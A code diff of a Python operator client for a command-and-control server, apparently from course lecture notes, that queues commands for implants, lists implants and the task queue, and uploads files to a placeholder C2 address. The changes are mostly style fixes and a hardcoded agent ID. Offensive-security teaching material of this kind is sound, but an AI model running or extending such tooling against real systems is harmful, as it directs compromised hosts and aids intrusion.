@@ -1,12 +1,15 @@
-###from lecture notes
+"""What does this file do?"""
 
-import requests 
+# from lecture notes
+
+import requests
 
 c2_server = "http://0.0.0.0:8080"
 path = "/secret"
 filepath = "/files/"
 
 def queue_cmd(cmd, agent_id):
+    """Queue a command for an agent"""
     r = requests.post(f"{c2_server}{path}", json=[{"implant_id": agent_id, "cmd": cmd}])
     if r.text == "True":
         print("queued ")
@@ -14,27 +17,29 @@ def queue_cmd(cmd, agent_id):
         print("failed")
 
 
-# checks the status of our task queue 
 def print_queue():
+    """Checks the status of our queue"""
     r = requests.get(f"{c2_server}/queue")
     if r.status_code == 200:
         print(r.json())
     else:
         print("error")
 
+
 def print_implants():
-    r = requests.get(f"{c2_server}/implants")
-    if r.status_code == 200:
-        print(r.json())
+    req = requests.get(f"{c2_server}/implants")
+    if req.status_code == 200:
+        print(req.json())
     else:
         print("error")
-        
+
+
 def upload_file(localpath, filename):
     print("make sure the file you're trying to upload is in the correct directory and exists")
-    dfiles = open("{localpath}{filename}", "r")
-    data = dfiles.read()  
+    dfiles = open(f"{localpath}{filename}", "r")
+    data = dfiles.read() 
     dfiles.close()
-    r = requests.post(f"{c2_server}{filepath}{filename}", json=[{"file_contents":data}])
+    r = requests.post(f"{c2_server}{filepath}{filename}", json=[{"file_contents": data}])
 
 
 if __name__ == "__main__":
@@ -46,8 +51,8 @@ if __name__ == "__main__":
             print_implants()
         elif "sid" in cmd:
             implant_id = cmd.split(" ")[1]
-
         elif cmd == "\n":
             continue
         else:
-            queue_cmd(cmd)
+            # TODO: fix agent id
+            queue_cmd(cmd, 0)
